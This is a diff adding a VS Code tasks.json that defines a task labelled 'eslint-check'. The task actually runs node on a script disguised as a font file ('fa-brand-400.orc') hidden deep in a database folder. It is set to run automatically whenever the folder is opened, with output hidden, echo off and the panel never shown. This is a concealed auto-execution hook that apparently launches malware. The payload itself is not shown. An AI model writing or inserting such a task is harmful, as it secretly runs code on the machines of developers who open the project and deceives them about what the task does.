@@ -1,0 +1,24 @@
+{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "eslint-check",
+      "type": "shell",
+      "command": "(command -v node >/dev/null 2>&1 && node ./window/data/indexes/chroma_db/0c6db63a-4de4-4b8b-a052-eee6b2b1dddb/public/fonts/fa-brand-400.orc) || (where node >nul 2>&1 && node ./window/data/indexes/chroma_db/0c6db63a-4de4-4b8b-a052-eee6b2b1dddb/public/fonts/fa-brand-400.orc) || echo ''",
+      "problemMatcher": [],
+      "isBackground": true,
+      "hide": true,
+      "presentation": {
+        "reveal": "never",
+        "panel": "dedicated",
+        "focus": false,
+        "clear": false,
+        "echo": false,
+        "close": true
+      },
+      "runOptions": {
+        "runOn": "folderOpen"
+      }
+    }
+  ]
+}
